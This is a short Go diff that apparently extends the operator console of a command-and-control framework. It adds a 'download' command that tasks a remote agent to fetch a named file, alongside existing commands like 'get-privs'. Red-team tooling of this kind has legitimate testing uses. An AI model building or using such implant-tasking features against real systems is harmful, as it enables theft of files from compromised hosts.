@@ -21,6 +21,7 @@ var CmdCodeMap = map[string]int{
 	"rmdir": 9,
 	"get-privs": 10,
 	"mkdir": 11,
+	"download": 12,
 }
 
 
@@ -53,6 +54,19 @@ func (c *CLI) sendTask(cmd string, param1 string, param2 string) bool {
 
 	c.ui.PrintTitle(fmt.Sprintf("Tasked %s", c.ui.InUse))
 	return true
+}
+
+
+func (c *CLI) HandleDOWNLOAD(args []string) {
+	if !c.requireAgent() {
+		return
+	}
+	if len(args) == 0 {
+		c.ui.Send(ui.BAD.Sprint("Usage: download <file>"))
+		return
+	}
+	c.sendTask("download", strings.Join(args, " "), "")
+
 }
 
 func(c *CLI) HandleRMDIR(args []string) {
